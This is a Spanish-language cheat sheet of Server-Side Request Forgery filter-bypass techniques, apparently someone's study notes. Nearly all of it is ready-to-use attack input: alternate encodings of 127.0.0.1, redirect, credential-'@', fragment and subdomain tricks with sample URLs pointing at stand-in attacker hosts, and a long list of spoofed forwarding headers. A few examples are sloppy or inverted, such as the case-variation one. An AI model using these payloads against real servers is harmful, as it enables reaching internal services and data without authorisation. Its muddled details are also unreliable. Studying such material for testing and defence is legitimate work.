---

### 🚀 **Server-Side Request Forgery (SSRF) Cheat Sheet**

---
---
## **Técnicas para Circunventar Filtros SSRF**

Algunas aplicaciones bloquean entradas comunes como `127.0.0.1` o `localhost`. Aquí hay técnicas para eludir estos filtros:

---

### **1. Usar Representación Alternativa de IP**
Representaciones de la IP `127.0.0.1`:
- **Decimal:** `2130706433`
- 🔢 **Octal:** `017700000001`
- 📝 **Forma abreviada:** `127.1`

---

### 🏷️ **2. Registrar un Dominio Controlado**
Registra un dominio propio que resuelva a `127.0.0.1` para realizar pruebas o explotar la vulnerabilidad:  
- Ejemplo: `spoofed.burpcollaborator.net`

---

### 📝 **3. Ofuscar Cadenas Bloqueadas**
- 🔒 **URL Encoding:** Convertir caracteres especiales. Ejemplo:  
  ```
  /admin → %2Fadmin
  ```
- 🔀 **Case Variation:** Cambiar entre mayúsculas y minúsculas:  
  ```
  /Admin → /admin
  ```
---

### 🔁 **4. Usar Redirecciones**
Configura una redirección en un dominio controlado para apuntar a la URL objetivo.  
- **Entrada del usuario:**  
  ```
  http://malicious-site.com/redirect?url=http://target-site.com/admin
  ```
- **Cambio de Protocolo:**  
  ```
  http://malicious-site.com/redirect?url=https://target-site.com/admin
  ```
---

## 🗝️ **Técnicas de Evasión Adicionales**

### 📝 **Embedding Credentials en la URL**
Se pueden incrustar credenciales dentro de la URL usando `@`:  
```http
https://expected-host:fakepassword@evil-host
```
- El servidor ignora las credenciales y hace la solicitud a `evil-host`.

---

### 🚀 **Uso del Carácter `#` para Fragmentos**
El carácter `#` indica el inicio de un fragmento, que **no es enviado al servidor**:  
```http
https://evil-host#expected-host
```
- El servidor accede a `evil-host` ignorando el fragmento.

---

### 🌐 **Jerarquía de Nombres de Dominio**
El atacante puede usar el nombre de host como subdominio de un dominio controlado:  
```http
https://expected-host.evil-host
```
- El servidor hace la solicitud a `evil-host`.

---

## 🛡️ **Ejemplos Prácticos**

### 📝 **1. Embedding Credentials:**
```http
https://example.com?url=https://internal-service:fakepassword@malicious.com
```
- El servidor intenta acceder a `https://malicious.com`.

---

### 💥 **2. Uso de Fragmento en la URL:**
```http
https://example.com?url=https://malicious.com#internal-service
```
- El servidor ignora el fragmento y accede a `https://malicious.com`.

---

### 🔍 **3. Jerarquía de Dominio (DNS Naming Hierarchy):**
```http
https://example.com?url=https://internal-service.malicious.com
```
- El servidor hace la solicitud al dominio controlado por el atacante.

---

## 🗂️ **Cabeceras HTTP para Evasión de SSRF**
Algunas cabeceras útiles para intentar redirigir o manipular la solicitud:

```http
Host: vulnerable-website.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Forwarded-Port: 80
Forwarded: for=127.0.0.1;host=attacker.com;proto=http
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Referer: http://attacker.com
Origin: http://attacker.com
X-Forwarded-By: 127.0.0.1
X-Forwarded-Proto: https
Via: 1.1 attacker.com
X-Api-Version: 1.0
Max-Forwards: 10
X-Wap-Profile: http://attacker.com
Proxy-Authorization: Basic Zm9vOmJhcg==
Surrogate-Capability: attacker="Surrogate/1.0"
```

---

💾 **Guarda esta referencia en Obsidian para tener siempre a mano tus técnicas de SSRF!** 🚀